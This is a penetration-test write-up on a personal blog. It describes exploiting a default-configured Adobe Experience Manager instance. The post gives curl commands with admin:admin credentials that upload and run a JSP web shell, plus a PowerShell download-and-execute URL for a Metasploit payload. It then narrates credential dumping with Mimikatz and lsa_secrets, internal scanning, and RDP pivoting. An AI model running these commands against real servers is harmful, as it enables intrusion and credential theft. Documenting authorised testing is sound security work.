<!DOCTYPE html>
<html lang="en-us">
<head>
    <meta charset="utf-8">
    <title>Adobe Experience Manager Exploitation</title>

    <!-- mobile responsive meta -->
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="I was recently working on an external penetration testing assessment in which the only information provided to me was the IP address rangeâ€¦">
    
    <meta name="author" content="Themefisher">
    <meta name="generator" content="Hugo 0.62.2" />

    <!-- plugins -->
    
    <link rel="stylesheet" href="https://thenetsec.github.io/plugins/bootstrap/bootstrap.min.css ">
    
    <link rel="stylesheet" href="https://thenetsec.github.io/plugins/themify-icons/themify-icons.css ">
    
    <link rel="stylesheet" href="https://thenetsec.github.io/plugins/animate-css/animate.css ">
    
    <link rel="stylesheet" href="https://thenetsec.github.io/plugins/magnific-popup/magnific-popup.css ">
    
    <link rel="stylesheet" href="https://thenetsec.github.io/plugins/slick/slick.css ">
    

    <!-- Main Stylesheet -->
    
    <link rel="stylesheet" href="https://thenetsec.github.io/css/style.min.css" media="screen">

    <!--Favicon-->
    <link rel="shortcut icon" href="https://thenetsec.github.io/images/favicon.png " type="image/x-icon">
    <link rel="icon" href="https://thenetsec.github.io/images/favicon.png " type="image/x-icon">

</head>

<body id="body" data-spy="scroll" data-target=".navbar" data-offset="55">
  <div id="content">
    

<!-- Fixed Navigation -->
<nav id="navigation" class="navbar navbar-expand-lg navigation sticky-top">
	<div class="container">

		<!-- logo -->
		<a class="navbar-brand logo" href="/">
			
			TheNetSec
			
		</a>
		<!-- /logo -->

		<!-- responsive nav button -->
		<button class="navbar-toggler navbar-dark" type="button" data-toggle="collapse"
			data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
			aria-label="Toggle navigation">
			<span class="navbar-toggler-icon"></span>
		</button>
		<!-- /responsive nav button -->

		<!-- main nav -->
		
		<div class="collapse navbar-collapse" id="navbarSupportedContent">
			<ul class="navbar-nav ml-auto navigation-menu">
				<li class="nav-item"><a class="nav-link" href="/#body">Home</a></li>
				
				<li class="nav-item"><a class="nav-link" href="/#about">About Me</a></li>
				
				<li class="nav-item"><a class="nav-link" href="/#blog">Blog</a></li>
				
				<li class="nav-item"><a class="nav-link" href="/#contact">Contact</a></li>
				
			</ul>
		</div>
		
		<!-- /main nav -->

		
    
	</div>
</nav>
<!-- End Fixed Navigation -->

<section class="section">
  <div class="container">
    <div class="row">
      <div class="col-lg-8 offset-lg-2 text-center">
        <h1>Adobe Experience Manager Exploitation</h1>
        <ul class="list-inline mb-50">
          <li class="list-inline-item"><a href="/author/"></a></li>
          <li class="list-inline-item">Friday, Jan 10, 2020</li>
        </ul>
        <img class="img-fluid mb-50" src="https://thenetsec.github.io/images/blog/AEM.jpeg" alt="blog-image">
      </div>
      <div class="col-lg-8 offset-lg-2">
        <div class="post-single-content">
          <p>I was recently working on an external penetration testing assessment in which the only information provided to me was the IP address range. During the initial phase of active enumeration and information gathering, I enumerated subdomains, port-scanned, explored services and carried out several OSINT techniques.</p>
<p>A list of resources was compiled and ranked based on several factors including data like leaked credentials, outdated software, exposed services, etc.</p>
<p>In this activity, I identified a running Adobe Experience Manager Instance. Then I gathered more information about AEM like default credentials, any publicly known exploit and version details of AEM.</p>
<p><img src="/images/blog/1____f32f9IdCAw60hfg__3__6PA.png" alt="Figure 1: Adobe Experience ManagerÂ Login">
<em>Figure 1: Adobe Experience ManagerÂ Login</em></p>
<p>This AEM instance was installed with a default configuration and default credentials were working, I logged into AEM with the default user. ğŸ˜Š</p>
<p><img src="/images/blog/1__0wKLemm6UREx__U5UHf4l1Q.png" alt="Figure 2: AEM DefaultÂ Login">
<em>Figure 2: AEM DefaultÂ Login</em></p>
<p>In further reconnaissance, I identified a potential AEM RCE vulnerability. <a href="https://www.slideshare.net/0ang3el?utm_campaign=profiletracking&amp;utm_medium=sssite&amp;utm_source=ssslideview">Mikhail Egorov</a> has presented AEM Exploitation in PHDays Security Conference and focused my efforts to exploit this vulnerability.</p>
<p>AEM has a feature called â€˜RCETYPEâ€™, which can be used to get access to the server. I created a new â€˜RCETYPEâ€™ and used a sling operator which offers an adapter pattern to conveniently translate objects that implement the adaptable interface.</p>
<p>The exploitation required multiple steps to be executed as listed below:</p>
<ol>
<li><em>Create a Folder RCETYPE</em></li>
<li><em>Upload the JSP shell to a specific path</em></li>
<li><em>Move the app to a specific location.</em></li>
</ol>
<p>I have used following commands to create a malicious RCETYPE</p>
<ul>
<li>I have created a folder â€œRCETYPEâ€</li>
</ul>
<p><strong>_curl â€“u admin:admin â€“Fjcr:primaryType=nt:folder_** </strong><em>http://IPAddress/content/rcetype</em>**<a href="http://ipaddress/content/rcetype"></a></p>
<p><img src="/images/blog/1__JeoJPN6doUE__7q__rgN0gCw.png" alt="Figure 3: NodeÂ Created">
<em>Figure 3: NodeÂ Created</em></p>
<ul>
<li>I then uploaded a jsp shell to rcetype node.</li>
</ul>
<p><strong>_curl â€“u admin:admin â€“Fexec.jsp=@RCE.jsp_** </strong><em>http://IP</em>**<a href="http://IP"></a> <strong><em>Address /content/rcetype</em></strong></p>
<p>The jsp shell (shown below) was then used in order to try and execute operating system commands.</p>
<p>**_&lt;%@ page import=â€java.util.*,java.io.*,java.net.*â€%&gt;<br>
&lt;%<br>
//<br>
// JSP_KIT<br>
//<br>
// cmd.jsp = Command Execution (win32)<br>
//<br>
// by: Unknown<br>
// modified: 27/06/2003<br>
//<br>
%&gt;</p>
<!-- raw HTML omitted -->
<p>The shell code could then be used to execute operating system commands.</p>
<ul>
<li>Then I copied the rcetype to /apps.</li>
</ul>
<p><strong>_curl â€“u admin:admin â€“F:operation=copy â€“F:dest=/apps/rcetype_** </strong><em>http://IP</em>**<a href="http://IP"></a> <strong><em>Address /content/rcetype</em></strong></p>
<ul>
<li>I used sling to create a rce node bound to rcetype.</li>
</ul>
<p><strong>_curl â€“u admin:admin â€“Fsling:resourceType=rcetype_** </strong><em>http://IP</em>**<a href="http://IP"></a> <strong><em>Address/content/rce</em></strong></p>
<ul>
<li>I was able to launch the jsp script for code execution ğŸ˜Š</li>
</ul>
<p><strong>_curl â€“X â€œGETâ€_** </strong><em>http://IP</em>**<a href="http://IP"></a> <strong><em>Address /content/rce.exec Or Open this link in browser</em></strong></p>
<p><img src="/images/blog/1__4vAvr__H2SFdUcO__QKiQnAw.png" alt="Figure 4: CommandÂ Shell">
<em>Figure 4: CommandÂ Shell</em></p>
<p>My next step was to achieve better control via an interactive shell. To convert this command shell to a meterpreter shell I relied on â€œexploit/multi/script/web_deliveryâ€ Metasploit exploit.</p>
<p><strong>http://<!-- raw HTML omitted --> /content/rce.exec?cmd=powershell.exe%20-nop%20-w%20hidden%20-c%20$D=new-object%20net.webclient;$D.proxy=[Net.WebRequest]::GetSystemWebProxy();$D.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX%20$D.downloadstring(%27http://<!-- raw HTML omitted -->%27);</strong></p>
<p><img src="/images/blog/1__HjQY3rzubiWZfkz20dt__0Q.png" alt="Figure 5: Meterpreter Session">
Figure 5: Meterpreter Session</p>
<p>Using this meterpreter shell I fiddled with the compromised system and looked around for anything that could help me during post-exploitation. I got a meterpreter shell for a user who had local admin rights which then elevated to a SYSTEM shell.</p>
<p><img src="/images/blog/1__wdAvcOVrsYPGT4wCud51cw.png" alt="Figure 6: CurrentÂ User">
Figure 6: CurrentÂ User</p>
<p>Then I dumped hashes, tried to fetch clear text passwords using Mimikatz, extract delegation tokens and used post exploitation modules like lsa_secrets which gave me working clear-text credentials for one of the users.</p>
<p><img src="/images/blog/1__rQpdllogOl__RdlXC6GLXnQ.png" alt="Figure 7: LSAÂ Secrets">
Figure 7: LSAÂ Secrets<img src="/images/blog/1__ZsY1MSvWFqcj__olUinENew.png" alt="Figure 8: MimikatzÂ Output">
Figure 8: MimikatzÂ Output<img src="/images/blog/1__OW0xpEKRwbTB1hcxGFWUWQ.png" alt="Figure 9: CacheÂ Dump">
Figure 9: CacheÂ Dump</p>
<p>As the compromised host was in a domain, I used a meterpreter shell to enumerate more about the domain (i.e. users, groups, password policy, DC)</p>
<p><img src="/images/blog/1__XxjnNhCz2PZj7hmaRgxC0A.png" alt="Figure 10: DomainÂ Admins">
<em>Figure 10: DomainÂ Admins</em></p>
<p>Then I enumerated the password policy details using the obtained credentials. Seeing the password policy did implement lockout I ruled out password brute force.</p>
<p><img src="/images/blog/1__e__yn__YM3neP0TWvmRnVd7g.png" alt="Figure 11: Domain Account and Password PolicyÂ Details">
Figure 11: Domain Account and Password PolicyÂ Details</p>
<p>I performed an ARP scan to identify live hosts on the network using a post-exploitation Metasploit module and identified multiple hosts and started performing internal scans for the most common services (i.e SMB, SSH, RDP, etc.)</p>
<p><img src="/images/blog/1__iu6uJAdL1smwPYr4HuL8RA.png" alt="Figure 12: Internal NetworkÂ Scan">
Figure 12: Internal NetworkÂ Scan</p>
<p>Further analysis didnâ€™t reveal much attack surface hence I focused on single user and system where I had access. With clear text credentials at hand, it was easier to investigate the box using RDP Access. Hence RDP access was obtained leveraging port forwarding. Then I did port forwarding and took RDP access of the compromised system using the compromised credentials which we got from the Metasploit post exploitation module (lsa_secrets)</p>
<p><img src="/images/blog/1__XU6v8k3x5hK0xJYTwlXHpg.png" alt="Figure 13: Port Forwarding">
Figure 13: Port Forwarding<img src="/images/blog/1__AXTUNnu__snsBXw64MBIQpg.png" alt="Figure 14: RDPÂ Session">
Figure 14: RDPÂ Session</p>
<p>During further recon, I identified sensitive information stored in the config file and saved credentials.</p>
<p><img src="/images/blog/1__1cxP1rD0__JoSyseY17__b__A.png" alt="Figure 15: Password Stored in ConfigÂ File">
Figure 15: Password Stored in ConfigÂ File<img src="/images/blog/1__zBWjQaJruYyy9fvJCR4SEw.png" alt="Figure 16: StoredÂ Password">
Figure 16: StoredÂ Password</p>
<p>I also found credentials in Browser Saved Passwords.</p>
<p><img src="/images/blog/1__bTyWc3ScVxsSyo4gjNyiWQ.png" alt="Figure 17: Saved Password in WebÂ Browser">
Figure 17: Saved Password in WebÂ Browser</p>
<p>However, I had to stop the attack at this point as this didnâ€™t lead to any new target area and the client was interested in working on remediation.</p>
<p>Unfortunately, in this instance, I was not able to compromise the domain controller and therefore the entire domain, however as I have stated from the external network and due to default application install that came with a pre-installed account. I was able to gain internal network access.</p>
<p>HAPPY HUNTINGÂ :)</p>

        </div>
        
        

<div class="social-share pt-4">
	<h4>Share:</h4>
	
	<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fthenetsec.github.io%2fblog%2f2018-07-23_adobe-experience-manager-exploitation-24bd9eb75ed9%2f" target="_blank"
		rel="noopener" aria-label="">
		<div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small">
			<div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
					<path d="M18.77 7.46H14.5v-1.9c0-.9.6-1.1 1-1.1h3V.5h-4.33C10.24.5 9.5 3.44 9.5 5.32v2.15h-3v4h3v12h5v-12h3.85l.42-4z" />
				</svg>
			</div>
		</div>
	</a>

	
	<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?text=Adobe%20Experience%20Manager%20Exploitation&amp;url=https%3a%2f%2fthenetsec.github.io%2fblog%2f2018-07-23_adobe-experience-manager-exploitation-24bd9eb75ed9%2f"
		target="_blank" rel="noopener" aria-label="">
		<div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
			<div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
					<path
						d="M23.44 4.83c-.8.37-1.5.38-2.22.02.93-.56.98-.96 1.32-2.02-.88.52-1.86.9-2.9 1.1-.82-.88-2-1.43-3.3-1.43-2.5 0-4.55 2.04-4.55 4.54 0 .36.03.7.1 1.04-3.77-.2-7.12-2-9.36-4.75-.4.67-.6 1.45-.6 2.3 0 1.56.8 2.95 2 3.77-.74-.03-1.44-.23-2.05-.57v.06c0 2.2 1.56 4.03 3.64 4.44-.67.2-1.37.2-2.06.08.58 1.8 2.26 3.12 4.25 3.16C5.78 18.1 3.37 18.74 1 18.46c2 1.3 4.4 2.04 6.97 2.04 8.35 0 12.92-6.92 12.92-12.93 0-.2 0-.4-.02-.6.9-.63 1.96-1.22 2.56-2.14z" />
				</svg>
			</div>
		</div>
	</a>

	
	<a class="resp-sharing-button__link" href="https://plus.google.com/share?url=https%3a%2f%2fthenetsec.github.io%2fblog%2f2018-07-23_adobe-experience-manager-exploitation-24bd9eb75ed9%2f" target="_blank"
		rel="noopener" aria-label="">
		<div class="resp-sharing-button resp-sharing-button--google resp-sharing-button--small">
			<div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
					<path
						d="M11.37 12.93c-.73-.52-1.4-1.27-1.4-1.5 0-.43.03-.63.98-1.37 1.23-.97 1.9-2.23 1.9-3.57 0-1.22-.36-2.3-1-3.05h.5c.1 0 .2-.04.28-.1l1.36-.98c.16-.12.23-.34.17-.54-.07-.2-.25-.33-.46-.33H7.6c-.66 0-1.34.12-2 .35-2.23.76-3.78 2.66-3.78 4.6 0 2.76 2.13 4.85 5 4.9-.07.23-.1.45-.1.66 0 .43.1.83.33 1.22h-.08c-2.72 0-5.17 1.34-6.1 3.32-.25.52-.37 1.04-.37 1.56 0 .5.13.98.38 1.44.6 1.04 1.84 1.86 3.55 2.28.87.23 1.82.34 2.8.34.88 0 1.7-.1 2.5-.34 2.4-.7 3.97-2.48 3.97-4.54 0-1.97-.63-3.15-2.33-4.35zm-7.7 4.5c0-1.42 1.8-2.68 3.9-2.68h.05c.45 0 .9.07 1.3.2l.42.28c.96.66 1.6 1.1 1.77 1.8.05.16.07.33.07.5 0 1.8-1.33 2.7-3.96 2.7-1.98 0-3.54-1.23-3.54-2.8zM5.54 3.9c.33-.38.75-.58 1.23-.58h.05c1.35.05 2.64 1.55 2.88 3.35.14 1.02-.08 1.97-.6 2.55-.32.37-.74.56-1.23.56h-.03c-1.32-.04-2.63-1.6-2.87-3.4-.13-1 .08-1.92.58-2.5zM23.5 9.5h-3v-3h-2v3h-3v2h3v3h2v-3h3" />
				</svg>
			</div>
		</div>
	</a>

	
	<a class="resp-sharing-button__link" href="mailto:?subject=Adobe%20Experience%20Manager%20Exploitation&amp;body=https%3a%2f%2fthenetsec.github.io%2fblog%2f2018-07-23_adobe-experience-manager-exploitation-24bd9eb75ed9%2f" target="_self"
		rel="noopener" aria-label="">
		<div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small">
			<div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
					<path
						d="M22 4H2C.9 4 0 4.9 0 6v12c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zM7.25 14.43l-3.5 2c-.08.05-.17.07-.25.07-.17 0-.34-.1-.43-.25-.14-.24-.06-.55.18-.68l3.5-2c.24-.14.55-.06.68.18.14.24.06.55-.18.68zm4.75.07c-.1 0-.2-.03-.27-.08l-8.5-5.5c-.23-.15-.3-.46-.15-.7.15-.22.46-.3.7-.14L12 13.4l8.23-5.32c.23-.15.54-.08.7.15.14.23.07.54-.16.7l-8.5 5.5c-.08.04-.17.07-.27.07zm8.93 1.75c-.1.16-.26.25-.43.25-.08 0-.17-.02-.25-.07l-3.5-2c-.24-.13-.32-.44-.18-.68s.44-.32.68-.18l3.5 2c.24.13.32.44.18.68z" />
				</svg>
			</div>
		</div>
	</a>

</div>
        
        
        <div class="mt-5">
          
        </div>
      </div>
    </div>
  </div>
</section>


  </div><!-- end Contact Area -->
<footer id="footer" class="section-bg">
	<div class="container">
		<div class="row wow fadeInUp" data-wow-duration="500ms">
			<div class="col-xl-12">

				<!-- Footer Social Links -->
				<div class="social-icon">
					<ul class="list-inline">
						
						<li class="list-inline-item"><a href="https://twitter.com/7echsec"><i class="ti-twitter-alt"></i></a></li>
						
						<li class="list-inline-item"><a href="https://in.linkedin.com/in/pratik-shah-8a589220"><i class="ti-linkedin"></i></a></li>
						
						<li class="list-inline-item"><a href="https://github.com/pr4tik"><i class="ti-dribbble"></i></a></li>
						
					</ul>
				</div>

				<!-- copyright -->
				<div class="copyright text-center">
					<a href="https://thenetsec.github.io/">
					</a>
					<p>copyright Â© 2019</p>
				</div>
			</div>
		</div>
	</div>
</footer>
<!-- /footer -->


<!-- JS Plugins -->

<script src="https://thenetsec.github.io/plugins/jquery/jquery.min.js"></script>

<script src="https://thenetsec.github.io/plugins/bootstrap/bootstrap.min.js"></script>

<script src="https://thenetsec.github.io/plugins/slick/slick.min.js"></script>

<script src="https://thenetsec.github.io/plugins/shuffle/shuffle.min.js"></script>

<script src="https://thenetsec.github.io/plugins/magnific-popup/jquery.magnific-popup.min.js"></script>

<script src="https://thenetsec.github.io/plugins/wow/wow.min.js"></script>

<!-- Main Script -->

<script src="https://thenetsec.github.io/js/script.min.js"></script>
<!-- google analitycs -->

<script>
  (function (i, s, o, g, r, a, m) {
    i['GoogleAnalyticsObject'] = r;
    i[r] = i[r] || function () {
      (i[r].q = i[r].q || []).push(arguments)
    }, i[r].l = 1 * new Date();
    a = s.createElement(o),
      m = s.getElementsByTagName(o)[0];
    a.async = 1;
    a.src = g;
    m.parentNode.insertBefore(a, m)
  })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
  ga('create', 'Your ID', 'auto');
  ga('send', 'pageview');
</script>
</body>

</html>